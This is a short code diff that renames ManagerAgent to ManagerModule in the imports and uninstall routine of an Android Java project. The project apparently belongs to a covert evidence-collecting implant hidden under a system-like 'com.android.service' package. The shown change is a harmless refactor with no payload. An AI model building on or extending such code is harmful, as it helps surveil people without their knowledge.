@@ -20,7 +20,7 @@ import com.android.service.auto.Cfg;
 import com.android.service.conf.ConfAction;
 import com.android.service.evidence.EvidenceCollector;
 import com.android.service.evidence.Markup;
-import com.android.service.manager.ManagerAgent;
+import com.android.service.manager.ManagerModule;
 import com.android.service.manager.ManagerEvent;
 import com.android.service.util.Check;
 
@@ -80,7 +80,7 @@ public class UninstallAction extends SubActionSlow {
 			Check.log(TAG + " (stopServices)");//$NON-NLS-1$
 		}
 
-		ManagerAgent.self().stopAll();
+		ManagerModule.self().stopAll();
 		ManagerEvent.self().stopAll();
 		Status.self().unTriggerAll();
 		return true;
